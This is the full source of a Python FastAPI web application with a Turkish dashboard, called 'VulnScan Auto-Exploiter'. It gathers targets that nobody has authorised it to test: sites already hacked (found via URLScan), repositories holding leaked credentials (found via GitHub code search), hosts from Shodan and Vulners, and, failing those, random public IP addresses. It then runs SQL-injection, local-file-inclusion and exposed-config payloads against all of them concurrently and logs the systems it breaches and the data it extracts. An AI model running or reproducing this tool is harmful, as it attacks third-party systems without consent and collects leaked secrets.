from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import sqlite3
import urllib.parse
import os
import logging
import time
import random
from typing import List
import uvicorn

# --- SİSTEM LOGLAMA AYARLARI ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("VulnScan")

app = FastAPI(title="VulnScan Auto-Exploiter - Global Leak & OSINT Edition")

# --- VERİTABANI VE DİZİN AYARLARI ---
DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
if not os.path.exists(DATA_DIR):
    try:
        os.makedirs(DATA_DIR)
    except Exception:
        DATA_DIR = "."

DB_PATH = os.path.join(DATA_DIR, "vulnscan.db")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.execute('PRAGMA journal_mode=WAL;')
    conn.execute('PRAGMA busy_timeout=5000;')
    return conn

def init_db():
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS exploited 
                     (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                      payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS leaked_targets 
                     (id INTEGER PRIMARY KEY, source TEXT, target_url TEXT, 
                      leak_info TEXT, timestamp TIMESTAMP)''')
        conn.commit()

init_db()

# --- WEBSOCKET CANLI LOG VE DURUM YÖNETİMİ ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

class WSHandler(logging.Handler):
    def emit(self, record):
        log_entry = {
            "type": "log",
            "time": self.format(record).split('|')[0].strip(),
            "level": record.levelname,
            "message": self.format(record).split('|')[-1].strip()
        }
        try:
            loop = asyncio.get_running_loop()
            asyncio.run_coroutine_threadsafe(manager.broadcast(log_entry), loop)
        except RuntimeError:
            pass

ws_handler = WSHandler()
ws_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S'))
logger.addHandler(ws_handler)

# --- ZAFİYET VE SIZMA PAYLOAD'LARI ---
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive"
}

PHP_PATHS = ["/phpinfo.php", "/info.php", "/.env", "/wp-config.php.bak", "/config.php~"]
SQLI_PAYLOADS = ["'", "\"", "' OR 1=1 --", "1' AND SLEEP(3)--", "1') AND SLEEP(3)--"]
SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query", "SQLSTATE"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"]

# --- API ANAHTARLARI (Ortam Değişkenlerinden Alınır) ---
SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
VULNERS_API_KEY = os.environ.get("VULNERS_API_KEY", "")

# --- GELİŞMİŞ OSINT VE SIZINTI KEŞFİ ---
async def fetch_global_leaks_and_targets(session):
    logger.info("Gelişmiş OSINT ve Sızıntı Motoru Başlatıldı. Tüm kaynaklar taranıyor...")
    targets = set()
    
    # 1. URLScan.io (Hacklenmiş ve Deface edilmiş siteleri bulma)
    try:
        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"', 'task.tags:"leak"']
        for q in queries:
            encoded_q = urllib.parse.quote(q)
            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size=100"
            async with session.get(url, timeout=15) as res:
                if res.status == 200:
                    data = await res.json()
                    for result in data.get('results', []):
                        page_url = result.get('page', {}).get('url')
                        if page_url and page_url.startswith("http"):
                            targets.add(page_url)
                            with get_db() as conn:
                                c = conn.cursor()
                                c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
                                          ("URLScan", page_url, q))
                                conn.commit()
                await asyncio.sleep(1) # Rate limit koruması
    except Exception as e:
        logger.error(f"URLScan Sızıntı Hatası: {e}")

    # 2. GitHub Code Search (Sızdırılmış .env, config, wp-config dosyaları)
    if GITHUB_TOKEN:
        try:
            gh_headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
            gh_queries = ['DB_PASSWORD+filename:.env', 'AWS_ACCESS_KEY_ID+filename:config', 'mysql_password+filename:wp-config.php']
            for gq in gh_queries:
                url = f"https://api.github.com/search/code?q={gq}&per_page=50"
                async with session.get(url, headers=gh_headers, timeout=15) as res:
                    if res.status == 200:
                        data = await res.json()
                        for item in data.get('items', []):
                            repo_url = item.get('repository', {}).get('html_url')
                            if repo_url:
                                targets.add(repo_url) # Repoyu hedef olarak ekle (Tarama için)
                                with get_db() as conn:
                                    c = conn.cursor()
                                    c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
                                              ("GitHub", repo_url, gq))
                                    conn.commit()
                await asyncio.sleep(2) # GitHub API rate limit
        except Exception as e:
            logger.error(f"GitHub Sızıntı Hatası: {e}")

    # 3. Vulners API (Bilinen zafiyetli IP ve domainleri çekme)
    if VULNERS_API_KEY:
        try:
            # Exploit içeren zafiyetleri arama
            query = {"query": "type:exploit AND (Apache OR PHP OR Nginx)", "size": 50}
            headers = {"X-Api-Key": VULNERS_API_KEY, "Content-Type": "application/json"}
            async with session.post("https://vulners.com/api/v3/search/lucene/", json=query, headers=headers, timeout=15) as res:
                if res.status == 200:
                    data = await res.json()
                    for item in data.get('data', {}).get('search', []):
                        if 'href' in item:
                            targets.add(item['href'])
        except Exception as e:
            logger.error(f"Vulners API Hatası: {e}")

    # 4. Shodan (API varsa)
    if SHODAN_API_KEY:
        try:
            queries = ['http.title:"index of"', 'Server: Apache/2.2']
            for q in queries:
                encoded_q = urllib.parse.quote(q)
                url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={encoded_q}"
                async with session.get(url, timeout=15) as res:
                    if res.status == 200:
                        data = await res.json()
                        for match in data.get('matches', [])[:50]:
                            ip = match.get('ip_str')
                            port = match.get('port')
                            if port == 80: targets.add(f"http://{ip}")
                            elif port == 443: targets.add(f"https://{ip}")
        except Exception as e:
            logger.error(f"Shodan Hatası: {e}")

    # Fallback (Tüm API'ler çökerse rastgele IP üretimi)
    if len(targets) == 0:
        logger.warning("Hiçbir API'den yanıt alınamadı. Rastgele IP blokları taranıyor...")
        for _ in range(100):
            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
            targets.add(f"http://{ip}")
        
    logger.info(f"Sızıntı ve OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
    return list(targets)

# --- HEDEF TARAMA VE SIZMA FONKSİYONU ---
async def scan_and_exploit(session, target_url):
    report = {"target": target_url, "exploits": [], "status": "OK"}
    
    try:
        async with session.get(target_url, timeout=8, ssl=False, allow_redirects=True, headers=HEADERS) as response:
            if response.status not in [200, 301, 302]:
                report["status"] = f"HTTP {response.status}"
                return report

            # 1. PHP Bilgi Sızıntısı ve Config Kontrolü
            for path in PHP_PATHS:
                test_url = f"{target_url.rstrip('/')}{path}"
                try:
                    async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                        if res.status == 200:
                            text = await res.text()
                            if "PHP Version" in text or "DB_PASSWORD" in text or "root:x:0:0" in text:
                                report["exploits"].append({
                                    "type": "PHP Config/Bilgi Sızıntısı", 
                                    "payload": path, 
                                    "evidence": text[:50].replace('\n', ' ') + "..."
                                })
                                logger.critical(f"PHP Sızıntısı: {test_url}")
                                save_exploit(target_url, "PHP Info Leak", path, text[:200])
                except asyncio.TimeoutError:
                    pass

            # 2. SQL Injection Kontrolü
            for payload in SQLI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                start_time = time.time()
                try:
                    async with session.get(test_url, timeout=10, ssl=False, headers=HEADERS) as res:
                        response_time = time.time() - start_time
                        text = (await res.text()).lower()
                        
                        if "sleep" in payload and response_time > 2.5:
                            report["exploits"].append({"type": "Time-Based SQLi", "payload": payload, "evidence": f"Gecikme: {response_time:.2f}s"})
                            logger.critical(f"SQLi Sömürüldü (Time): {target_url}")
                            save_exploit(target_url, "Time-Based SQLi", payload, f"Delay: {response_time:.2f}s")
                            break
                        
                        for error in SQL_ERRORS:
                            if error in text:
                                report["exploits"].append({"type": "Error-Based SQLi", "payload": payload, "evidence": error})
                                logger.critical(f"SQLi Sömürüldü (Error): {target_url}")
                                save_exploit(target_url, "Error-Based SQLi", payload, error)
                                break
                except asyncio.TimeoutError:
                    pass

            # 3. LFI Kontrolü
            for payload in LFI_PAYLOADS:
                test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                try:
                    async with session.get(test_url, timeout=5, ssl=False, headers=HEADERS) as res:
                        text = await res.text()
                        if "root:x:0:0" in text or "[extensions]" in text:
                            report["exploits"].append({"type": "LFI (File Inclusion)", "payload": payload, "evidence": "Sistem dosyası okundu!"})
                            logger.critical(f"LFI Sömürüldü: {target_url}")
                            save_exploit(target_url, "LFI", payload, "System File Read Success")
                            break
                except asyncio.TimeoutError:
                    pass

    except Exception:
        report["status"] = "ERROR"
        
    if report["exploits"]:
        report["status"] = "SIZILDI"
        
    await manager.broadcast({"type": "scan_result", "data": report})
    return report

def save_exploit(url, vuln, payload, data):
    with get_db() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO exploited (target_url, vuln_type, payload, extracted_data, timestamp) 
                     VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''', (url, vuln, payload, data))
        conn.commit()

# --- OTONOM TARAMA API'Sİ ---
@app.post("/api/auto-scan")
async def auto_scan():
    logger.info("Küresel Sızıntı ve Sızma Testi Başlatıldı.")
    
    connector = aiohttp.TCPConnector(limit=200, limit_per_host=5, ssl=False)
    timeout = aiohttp.ClientTimeout(total=15)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        targets = await fetch_global_leaks_and_targets(session)
        logger.info(f"Sızma testi başlıyor... Toplam {len(targets)} hedef.")
        
        semaphore = asyncio.Semaphore(200)
        async def limited_scan(url):
            async with semaphore:
                return await scan_and_exploit(session, url)

        tasks = [limited_scan(url) for url in targets]
        results = await asyncio.gather(*tasks)
        
    logger.info("Küresel Sızma Testi Tamamlandı. Veritabanı güncellendi.")
    return {"status": "success", "total_scanned": len(results), "results": results}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.get("/", response_class=HTMLResponse)
def read_root():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <title>VulnScan | Global Leak & Exploit</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg: #0a0b0d; --panel: #121418; --border: #22262e;
                --text: #c9d1d9; --accent: #58a6ff; --danger: #f85149;
                --warning: #d29922; --success: #3fb950;
            }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background-color: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
            
            .header { padding: 15px 25px; background: var(--panel); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
            .header h1 { font-size: 1.4rem; font-weight: 600; color: #fff; }
            .header .subtitle { font-size: 0.8rem; color: var(--danger); font-weight: 600; letter-spacing: 1px; }
            
            .btn-start { background: var(--danger); color: #fff; border: none; padding: 10px 20px; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 1rem; transition: 0.2s; }
            .btn-start:hover { background: #da3633; }
            .btn-start:disabled { background: #30363d; cursor: not-allowed; color: #8b949e; }

            .main-layout { display: flex; flex: 1; overflow: hidden; }
            
            .terminal-panel { width: 40%; background: #000; border-right: 1px solid var(--border); display: flex; flex-direction: column; }
            .panel-title { padding: 10px 15px; background: var(--panel); border-bottom: 1px solid var(--border); font-size: 0.85rem; color: #8b949e; font-weight: 600; text-transform: uppercase; }
            .terminal { flex: 1; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; line-height: 1.6; }
            .log-line { margin-bottom: 4px; word-wrap: break-word; }
            .log-time { color: #484f58; }
            .log-info { color: var(--accent); }
            .log-warning { color: var(--warning); }
            .log-critical { color: var(--danger); font-weight: bold; }
            
            .results-panel { width: 60%; display: flex; flex-direction: column; background: var(--bg); }
            .results-list { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
            
            .site-card { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 15px; display: flex; flex-direction: column; gap: 8px; }
            .site-card.sizildi { border-left: 4px solid var(--danger); background: rgba(248, 81, 73, 0.05); }
            .site-card.temiz { border-left: 4px solid var(--success); }
            .site-card.hata { border-left: 4px solid var(--warning); opacity: 0.7; }
            
            .site-header { display: flex; justify-content: space-between; align-items: center; }
            .site-url { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text); word-break: break-all; }
            .site-status { font-size: 0.75rem; padding: 4px 10px; border-radius: 4px; font-weight: 600; }
            .status-sizildi { background: rgba(248, 81, 73, 0.2); color: var(--danger); border: 1px solid var(--danger); }
            .status-temiz { background: rgba(63, 185, 80, 0.1); color: var(--success); }
            .status-hata { background: rgba(210, 153, 34, 0.1); color: var(--warning); }
            
            .exploit-detail { font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; color: var(--danger); background: #000; padding: 8px; border-radius: 4px; border: 1px solid #333; margin-top: 5px; }
        </style>
    </head>
    <body>
        <div class="header">
            <div>
                <h1>VulnScan Auto-Exploiter</h1>
                <div class="subtitle">GLOBAL LEAK & EXPLOIT MOTORU</div>
            </div>
            <button class="btn-start" onclick="startAutoScan()" id="scanBtn">Küresel Taramayı Başlat</button>
        </div>

        <div class="main-layout">
            <div class="terminal-panel">
                <div class="panel-title">Canlı Sistem Logları</div>
                <div id="terminal" class="terminal"></div>
            </div>
            
            <div class="results-panel">
                <div class="panel-title">Tespit Edilen ve Sızılan Sistemler (<span id="scan-count">0</span>)</div>
                <div id="results-list" class="results-list"></div>
            </div>
        </div>

        <script>
            const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(protocol + window.location.host + "/ws");
            const terminal = document.getElementById('terminal');
            const resultsList = document.getElementById('results-list');
            const scanCount = document.getElementById('scan-count');
            
            let targetCount = 0;

            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                
                if (data.type === "log") {
                    const line = document.createElement("div");
                    line.className = "log-line";
                    let colorClass = "log-info";
                    if (data.level === "WARNING") colorClass = "log-warning";
                    if (data.level === "CRITICAL" || data.level === "ERROR") colorClass = "log-critical";

                    line.innerHTML = `<span class="log-time">[${data.time}]</span> <span class="${colorClass}">${data.message}</span>`;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                } 
                else if (data.type === "scan_result") {
                    targetCount++;
                    scanCount.innerText = targetCount;
                    
                    const res = data.data;
                    const card = document.createElement("div");
                    
                    let cardClass = "site-card temiz";
                    let statusClass = "status-temiz";
                    let statusText = "TEMİZ";
                    
                    if (res.exploits && res.exploits.length > 0) {
                        cardClass = "site-card sizildi";
                        statusClass = "status-sizildi";
                        statusText = "SIZILDI";
                    } else if (res.status !== "OK") {
                        cardClass = "site-card hata";
                        statusClass = "status-hata";
                        statusText = res.status;
                    }
                    
                    card.className = cardClass;
                    
                    let exploitHtml = "";
                    if (res.exploits && res.exploits.length > 0) {
                        res.exploits.forEach(exp => {
                            exploitHtml += `<div class="exploit-detail">
                                <strong>${exp.type}</strong><br>
                                Payload: ${exp.payload || exp.path}<br>
                                Kanıt: ${exp.evidence}
                            </div>`;
                        });
                    }
                    
                    card.innerHTML = `
                        <div class="site-header">
                            <div class="site-url">${res.target}</div>
                            <div class="site-status ${statusClass}">${statusText}</div>
                        </div>
                        ${exploitHtml}
                    `;
                    
                    resultsList.insertBefore(card, resultsList.firstChild);
                }
            };

            async function startAutoScan() {
                document.getElementById('scanBtn').disabled = true;
                document.getElementById('scanBtn').innerText = "Taranıyor...";
                terminal.innerHTML = "";
                resultsList.innerHTML = "";
                targetCount = 0;
                scanCount.innerText = "0";

                try {
                    await fetch('/api/auto-scan', { method: 'POST' });
                } catch (error) {
                    console.error(error);
                } finally {
                    document.getElementById('scanBtn').disabled = false;
                    document.getElementById('scanBtn').innerText = "Küresel Taramayı Başlat";
                }
            }
        </script>
    </body>
    </html>
    """

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
